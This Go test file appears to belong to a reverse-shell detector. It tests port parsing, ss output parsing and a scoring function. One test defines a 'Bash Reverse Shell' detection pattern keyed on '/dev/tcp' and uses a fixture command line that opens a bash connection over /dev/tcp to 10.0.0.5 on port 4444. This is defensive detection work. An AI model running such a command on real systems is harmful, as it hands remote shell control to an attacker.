package detector

import (
	"strings"
	"testing"
)

func TestExtractPort(t *testing.T) {
	tests := []struct {
		name string
		addr string
		want int
	}{
		{name: "ipv4", addr: "10.0.0.1:4444", want: 4444},
		{name: "ipv6", addr: "[::1]:8080", want: 8080},
		{name: "missing port", addr: "10.0.0.1", want: 0},
		{name: "invalid port", addr: "10.0.0.1:notaport", want: 0},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := extractPort(tt.addr); got != tt.want {
				t.Fatalf("extractPort(%q) = %d, want %d", tt.addr, got, tt.want)
			}
		})
	}
}

func TestParseSSUsers(t *testing.T) {
	pid, procName := parseSSUsers(`users:(("bash",pid=1234,fd=3))`)
	if pid != 1234 || procName != "bash" {
		t.Fatalf("parseSSUsers returned (%d, %q), want (1234, %q)", pid, procName, "bash")
	}

	pid, procName = parseSSUsers("users:()")
	if pid != 0 || procName != "" {
		t.Fatalf("parseSSUsers should ignore malformed data, got (%d, %q)", pid, procName)
	}
}

func TestProcessNameSetNormalizesKeys(t *testing.T) {
	for name := range ProcessNameSet() {
		if name != strings.ToLower(name) {
			t.Fatalf("process name %q is not normalized to lowercase", name)
		}
	}
}

func TestCalculateScoreCapsAtOneHundred(t *testing.T) {
	det := New()
	pat := Pattern{
		Name:         "Bash Reverse Shell",
		ProcessNames: []string{"bash"},
		CmdPatterns:  []string{"/dev/tcp"},
	}
	conn := Connection{
		Process:    "bash",
		State:      "ESTABLISHED",
		RemoteAddr: "10.0.0.5:4444",
		Cmdline:    "bash -c 'exec 5<>/dev/tcp/10.0.0.5/4444'",
	}

	if got := det.calculateScore(conn, pat); got != 100 {
		t.Fatalf("calculateScore() = %d, want 100", got)
	}
}
